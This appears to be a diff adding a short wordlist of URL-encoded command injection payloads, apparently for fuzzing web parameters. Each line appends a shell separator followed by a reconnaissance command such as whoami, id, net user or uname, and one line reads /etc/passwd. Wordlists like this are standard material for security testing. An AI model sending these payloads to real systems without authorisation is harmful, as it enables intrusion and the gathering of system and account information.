@@ -1,0 +1,10 @@
+%26%26+whoami
+%26%26+id
+%7C+whoami
+%26+ipconfig
+%26%26+cat+/etc/passwd
+%7C+net+user
+%26%26+dir
+%3B+whoami
+%7C+whoami
+%26%26+uname+-a
